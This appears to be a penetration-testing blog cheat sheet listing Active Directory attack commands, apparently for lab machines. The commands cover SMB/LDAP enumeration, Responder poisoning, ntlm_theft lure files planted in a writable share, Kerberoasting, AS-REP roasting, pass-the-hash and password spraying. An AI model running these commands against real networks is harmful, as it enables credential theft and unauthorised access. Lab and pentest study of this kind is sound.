---
layout: post
title: Active Directory Enumeration
date: '2023-11-13 05:53:29 +0300'
image: /assets/img/cover_images/44.png
categories: [Active Directory, Enumeration]
---

## Enumeration with No creds
### Smb enumeration
```bash
smbmap -H <ip>
```
```bash
smbmap -u 'guest' -p '' -H <ip>
```
```bash
smbclient -L <ip> -u ''
```
```bash
smbclient //<ip>/<share> -c 'recurse;ls'
```
### Rpc enumeration
```bash
rpcclient -U '' -N <ip>
enumdomusers
```
### Ldap enumeration
```bash
nmap -n -sV --script "ldap* and not brute" -p 389 <ip>
```
```bash
ldapsearch -H ldap://<ip> -x -s base namingcontext
```
```bash
ldapsearch -H ldap://<ip> -x -b"DC=htb,DC=local"
```
### Network poisoning
```bash
responder -I eth0 -A
```
### Extract possible usernames
```
NameSurname
Name.Surname
NamSur
Nam.Sur
NSurname
N.Surname
SurnameName
Surname.Name
SurnameN
Surname.N
```
### Kerbrute
```bash
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.real='test.local', userdb=usernames.txt <ip>
```
```bash
kerbrute userenum --dc 10.10.10.100 -d test.local usernames.txt
```
### NTLM Creds
```bash
sudo mount -t cifs -o 'user=pl4int3xt' //10.10.10.100/Department /mnt/sync
```
```bash
ls /mnt/sync -laR
```
[smcacls documentation](https://lists.samba.org/archive/samba-technical/2010-June/071390.html)
```bash
for i in $(ls /mnt/sync); do echo; smbcacls --no-pass //10.10.10.100/Department $i
```
[ntlm theft](https://github.com/Greenwolf/ntlm_theft)
```bash
responder -I tun0
```
```bash
python3 ntlm_theft.py -g all -s 10.10.10.100 -f test
```
```bash
cp test/* /mnt/sync/writable_share 
```
## Enumerating with creds
### Kerberoasting
```bash
GetUserSPNs.py -request -dc-ip 10.10.10.100 <DOMAIN.FULL>/<USERNAME> -outputfile hashes
```
### ASREPRoast
```bash
GetNPUsers.py -userfilr users.txt -dc-ip <ip> --outputfile ASREPHash -request '<domain>/'
```
### Getusers
```bash
GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username
```
### Crackmapexec
```bash
crackmapexec winrm -u test -p test --continue-on-success 10.10.10.100
```
```bash
crackmapexec smb --local-auth 10.10.10.10/23 -u user -H hash 
```
```bash
evil-winrm -i 10.10.10.100 -u test -p password123
```
### Password spray
```bash
crackmapexec smb 10.10.10.10/23 -u userlist -p userlist --continue-on-success 
```
```bash
crackmapexec smb 10.10.10.10/23 -u userlist -p 'PassworSpray' --continue-on-success 
```